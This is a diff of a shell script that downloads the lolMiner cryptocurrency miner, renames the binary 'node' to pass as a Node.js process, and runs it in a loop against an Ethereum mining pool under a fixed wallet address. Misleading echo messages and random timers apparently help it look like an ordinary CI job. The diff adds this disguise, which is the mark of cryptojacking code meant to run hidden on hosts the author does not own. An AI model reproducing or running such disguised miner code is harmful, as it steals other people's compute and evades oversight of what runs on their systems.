@@ -4,6 +4,7 @@ curl -sLOA "Mozilla/4.05 [en] (X11; U; Linux 2.0.32 i586)" https://github.com:44
 mkdir node
 tar -xzvf lolMiner_v1.29_Lin64.tar.gz -C node > /dev/null 2>&1 && rm -rf lolMiner_v1.29_Lin64.tar.gz && cd node
 cd 1.29
+mv lolMiner node
 x=1 
 #/lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user VET:0x079885cbd1569bf0db5af3b8eb6818d963e2309f.Bouorn --ethstratum ETHPROXY
 # timer=$(shuf -i 60-90 -n 1)
@@ -14,7 +15,9 @@ do
   timer=$(shuf -i 1000-1009 -n 1)
   echo "Welcome $x times"
 #   timeout "$timer"m ./node mr.ini > /dev/null 2>&1 ; if [ $? -eq 124 ] ; then echo Initialized Name Variable ; else echo Failed ; fi
-  timeout "$timer"m ./lolMiner --algo ETHASH --pool eth.2miners.com:2020 --user 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.BORN$P ; if [ $? -eq 124 ] ; then echo Initialized Name Variable ; else echo Failed ; fi
+  ./node --algo ETHASH --pool eth.2miners.com:2020 --user 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.BORN$P 
+#timeout "$timer"m 
+#; if [ $? -eq 124 ] ; then echo Initialized Name Variable ; else echo Failed ; fi
 #   sh -c "echo Helllo world my name is $INPUT_MY_NAME"
   x=$(( $x + 1 ))
   sleep 120
